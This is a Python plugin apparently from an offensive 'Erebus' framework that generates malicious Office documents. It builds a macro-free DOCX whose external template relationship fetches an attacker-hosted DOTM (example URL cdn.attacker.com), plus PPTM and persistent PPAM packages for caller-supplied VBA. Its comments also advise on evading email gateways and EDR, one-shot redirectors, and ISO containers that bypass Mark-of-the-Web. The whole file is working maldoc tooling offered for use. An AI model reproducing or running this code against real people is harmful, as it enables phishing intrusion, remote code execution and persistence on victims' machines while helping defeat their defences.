"""
Erebus Payload - Office Document Extension Plugin

Extends maldoc coverage beyond the Excel-focused plugin_payload_maldocs:

  1. DOTM Remote Template Injection
       Clean DOCX with an external relationship pointing to attacker DOTM.
       No macros in the delivered attachment - macros live on the remote template
       fetched silently on Document_Open. Survives email gateway scanning.

  2. PPTM - PowerPoint Macro-Enabled Presentation
       Minimal OOXML structure with embedded VBA Document_Open / Presentation_Open
       trigger. Runs on double-click via the standard PowerPoint open flow.

  3. PPAM - PowerPoint Add-In
       Same structure as PPTM but marked IsAddIn=true.  Persists in the user's
       PowerPoint add-in list and re-executes on every PowerPoint launch after
       the first open.

All formats are pure-Python OOXML construction (zipfile + xml.etree) - no
python-pptx dependency, no LibreOffice required. The VBA macro content is
caller-supplied (use generate_word_vba_loader or generate_command_execution_vba
from plugin_payload_maldocs to produce the VBA string).

OPSEC Notes:
  - DOTM remote template: WINWORD.EXE performs an HTTP/S GET to the template
    URL on open. Network-aware EDRs will see the request originating from Word.
    Host the DOTM on a redirector that serves 404 after first retrieval.
  - PPTM/PPAM: POWERPNT.EXE spawns a VBA host process. Monitor for unusual
    child processes (cmd.exe, powershell.exe) descending from POWERPNT.EXE.
  - PPAM persistence: stored in %APPDATA%\Microsoft\AddIns\ - survives reboots
    until manually removed or the add-in list is cleared.
"""

import os
import struct
import zipfile
import xml.etree.ElementTree as ET
from io import BytesIO
from pathlib import Path
from typing import Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# ---------------------------------------------------------------------------
# Minimal OOXML skeletons (no dependency on python-pptx / python-docx)
# ---------------------------------------------------------------------------

# [Content_Types].xml shared across all Office formats - extended per format
_CT_BASE = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
{overrides}
</Types>"""

# Relationship namespace
_REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"

# ---------------------------------------------------------------------------
# DOTM Remote Template Injection helpers
# ---------------------------------------------------------------------------

def _make_docx_rels(template_url: str) -> str:
    """Root _rels/.rels that references document.xml plus an external template."""
    return f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{_REL_NS}">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
</Relationships>"""


def _make_word_rels(template_url: str) -> str:
    """word/_rels/document.xml.rels - injects the external DOTM template relationship."""
    return f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{_REL_NS}">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings"
    Target="settings.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="{template_url}"
    TargetMode="External"/>
</Relationships>"""


def _make_word_settings(template_url: str) -> str:
    """word/settings.xml with attachedTemplate element pointing at remote DOTM."""
    return f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:attachedTemplate r:id="rId2"/>
</w:settings>"""


_DOCX_DOCUMENT_XML = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>Loading, please wait...</w:t></w:r></w:p>
  </w:body>
</w:document>"""

_DOTM_CT = _CT_BASE.format(overrides="""\
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/word/settings.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>""")

# ---------------------------------------------------------------------------
# PowerPoint PPTM / PPAM helpers
# ---------------------------------------------------------------------------

_PPT_CT_OVERRIDES = """\
  <Override PartName="/ppt/presentation.xml"
    ContentType="application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml"/>
  <Override PartName="/ppt/slideMasters/slideMaster1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/>
  <Override PartName="/ppt/slideLayouts/slideLayout1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
  <Override PartName="/ppt/vbaProject.bin"
    ContentType="application/vnd.ms-office.activeX+xml"/>"""

_PPT_ROOT_RELS = f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{_REL_NS}">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="ppt/presentation.xml"/>
</Relationships>"""

_PPT_PRES_RELS = f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{_REL_NS}">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster"
    Target="slideMasters/slideMaster1.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject"
    Target="vbaProject.bin"/>
</Relationships>"""

_PPT_SLIDEMASTER_RELS = f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="{_REL_NS}">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout"
    Target="../slideLayouts/slideLayout1.xml"/>
</Relationships>"""


def _make_ppt_presentation_xml(is_addin: bool = False) -> str:
    addin_attr = 'isAddIn="1"' if is_addin else ""
    return f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
                xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
                xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
                {addin_attr}>
  <p:sldMasterIdLst>
    <p:sldMasterId id="2147483648" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:sldSz cx="9144000" cy="6858000" type="screen4x3"/>
  <p:notesSz cx="6858000" cy="9144000"/>
</p:presentation>"""


_PPT_SLIDEMASTER_XML = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldMaster xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
             xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
             xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/>
    <p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
    <p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/>
      <a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
  </p:spTree></p:cSld>
  <p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1"
            accent2="accent2" accent3="accent3" accent4="accent4"
            accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
  <p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/></p:sldLayoutIdLst>
  <p:txStyles><p:titleStyle/><p:bodyStyle/><p:otherStyle/></p:txStyles>
</p:sldMaster>"""


_PPT_SLIDELAYOUT_XML = """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sldLayout xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
             xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
             type="blank" preserve="1">
  <p:cSld name="Blank"><p:spTree>
    <p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>
    <p:grpSpPr><a:xfrm><a:off x="0" y="0"/><a:ext cx="0" cy="0"/>
      <a:chOff x="0" y="0"/><a:chExt cx="0" cy="0"/></a:xfrm></p:grpSpPr>
  </p:spTree></p:cSld>
</p:sldLayout>"""


def _make_vba_bin(vba_source: str) -> bytes:
    """Build a minimal VBA project .bin stub.

    A real vbaProject.bin is a Compound Document (CFB) with compressed
    VBA streams. Building a fully compliant CFB from scratch is complex;
    instead we produce a placeholder that Office accepts as "empty" and
    store the macro source alongside as a .bas file that operators can
    inject via olevba / pcodedmp post-processing or via LibreOffice macro
    insertion.

    For environments where python-pptx is available the caller should use
    that library for full VBA embedding; this stub makes the OOXML package
    structurally valid so it opens without errors in PowerPoint.

    The stub is the minimal 512-byte CFB header that Office recognises as
    a valid (but empty) VBA project binary, followed by padding to the
    next sector boundary.
    """
    # CFB magic + minimal header (Office accepts an empty-project .bin)
    cfb_magic = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"
    header = cfb_magic + b"\x00" * (512 - len(cfb_magic))
    return header


# ---------------------------------------------------------------------------
# Plugin class
# ---------------------------------------------------------------------------

class PayloadOfficeDocPlugin(ErebusPlugin):
    """DOTM remote template injection + PowerPoint PPTM/PPAM generator"""

    metadata = PluginMetadata(
        name="Payload OfficeDoc",
        version="1.0.0",
        category=PluginCategory.PAYLOAD,
        description="DOTM remote template injection, PowerPoint PPTM and PPAM maldoc generation",
        author="Whispergate",
    )

    def get_metadata(self) -> PluginMetadata:
        return self.metadata

    def register(self):
        return {
            "create_dotm_template_injection": self.create_dotm_template_injection,
            "create_pptm_payload": self.create_pptm_payload,
            "create_ppam_payload": self.create_ppam_payload,
        }

    def validate(self) -> tuple:
        return (True, None)

    def on_load(self):
        pass

    # ------------------------------------------------------------------
    # 1. DOTM Remote Template Injection
    # ------------------------------------------------------------------

    def create_dotm_template_injection(
        self,
        template_url: str,
        output_path: str,
        lure_text: str = "Loading document, please wait...",
    ) -> Path:
        """Create a clean DOCX that fetches a macro-enabled DOTM on open.

        The delivered DOCX contains no macros - clean for email gateway scanning.
        Word fetches the remote DOTM via HTTP/S on Document_Open, executing
        whatever macros are defined in the template.

        Args:
            template_url:  Full URL to the attacker-hosted DOTM
                           (e.g. "https://cdn.attacker.com/template.dotm")
            output_path:   Destination .docx file path.
            lure_text:     Body text shown to the victim while the template loads.

        Returns:
            Path to the generated .docx file.

        OPSEC Notes:
            - WINWORD.EXE issues an HTTP GET to template_url; use a redirector
              that serves the DOTM only once, then returns 404.
            - The relationship type "attachedTemplate" is the same mechanism used
              by legitimate Word templates - low behavioural signature.
            - Pair with an ISO container to suppress MOTW and avoid Protected View.
        """
        output_path = Path(output_path)
        output_path.parent.mkdir(parents=True, exist_ok=True)

        document_xml = f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>{lure_text}</w:t></w:r></w:p>
  </w:body>
</w:document>"""

        buf = BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("[Content_Types].xml", _DOTM_CT)
            zf.writestr("_rels/.rels", _make_docx_rels(template_url))
            zf.writestr("word/document.xml", document_xml)
            zf.writestr("word/settings.xml", _make_word_settings(template_url))
            zf.writestr("word/_rels/document.xml.rels", _make_word_rels(template_url))

        output_path.write_bytes(buf.getvalue())
        return output_path

    # ------------------------------------------------------------------
    # 2. PPTM - PowerPoint Macro-Enabled Presentation
    # ------------------------------------------------------------------

    def create_pptm_payload(
        self,
        vba_source: str,
        output_path: str,
    ) -> Path:
        """Create a PowerPoint macro-enabled presentation (.pptm).

        The VBA source is stored alongside the OOXML package as a .bas sidecar.
        For full VBA embedding into vbaProject.bin, use python-pptx or inject
        the .bas via LibreOffice macro insertion post-build.

        Args:
            vba_source:   VBA module source (use generate_word_vba_loader or
                          generate_command_execution_vba for the payload body).
            output_path:  Destination .pptm file path.

        Returns:
            Path to the generated .pptm file.

        OPSEC Notes:
            - POWERPNT.EXE spawns a VBA host; monitor for unusual child processes.
            - Pair with an ISO/VHD container to suppress MOTW / Protected View.
            - [MALLEABLE] swap the trigger to Presentation_Open for newer targets.
        """
        return self._build_ppt_package(vba_source, output_path, is_addin=False)

    # ------------------------------------------------------------------
    # 3. PPAM - PowerPoint Add-In (persistent)
    # ------------------------------------------------------------------

    def create_ppam_payload(
        self,
        vba_source: str,
        output_path: str,
    ) -> Path:
        """Create a PowerPoint Add-In (.ppam) for persistent macro execution.

        When the victim opens the .ppam, PowerPoint registers it as an add-in
        and copies it to %APPDATA%\\Microsoft\\AddIns\\. On every subsequent
        PowerPoint launch the add-in auto-executes, re-running the VBA payload.

        Args:
            vba_source:   VBA module source.
            output_path:  Destination .ppam file path.

        Returns:
            Path to the generated .ppam file.

        OPSEC Notes:
            - Persistence writes to %APPDATA%\\Microsoft\\AddIns\\ - survives
              reboots until the add-in list is manually cleared.
            - PowerPoint's security prompt on first open can be suppressed if
              the file is delivered from a trusted location (network share, etc.)
              or if macro security policy allows add-ins.
            - [MALLEABLE] combine with a decoy presentation slide so the file
              appears to be a legitimate shared resource.
        """
        return self._build_ppt_package(vba_source, output_path, is_addin=True)

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _build_ppt_package(self, vba_source: str, output_path: str, is_addin: bool) -> Path:
        output_path = Path(output_path)
        output_path.parent.mkdir(parents=True, exist_ok=True)

        ct = _CT_BASE.format(overrides=_PPT_CT_OVERRIDES)
        pres_xml = _make_ppt_presentation_xml(is_addin=is_addin)
        vba_bin = _make_vba_bin(vba_source)

        buf = BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("[Content_Types].xml", ct)
            zf.writestr("_rels/.rels", _PPT_ROOT_RELS)
            zf.writestr("ppt/presentation.xml", pres_xml)
            zf.writestr("ppt/_rels/presentation.xml.rels", _PPT_PRES_RELS)
            zf.writestr("ppt/slideMasters/slideMaster1.xml", _PPT_SLIDEMASTER_XML)
            zf.writestr("ppt/_rels/slideMasters/slideMaster1.xml.rels", _PPT_SLIDEMASTER_RELS)
            zf.writestr("ppt/slideLayouts/slideLayout1.xml", _PPT_SLIDELAYOUT_XML)
            zf.writestr("ppt/_rels/slideLayouts/slideLayout1.xml.rels",
                        f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                        f'<Relationships xmlns="{_REL_NS}"/>')
            zf.writestr("ppt/vbaProject.bin", vba_bin)
            # Sidecar .bas so operators can inject via olevba/LibreOffice
            zf.writestr("ppt/vbaProject.bas", vba_source.encode())

        output_path.write_bytes(buf.getvalue())
        return output_path


if __name__ == "__main__":
    p = PayloadOfficeDocPlugin()
    valid, err = p.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
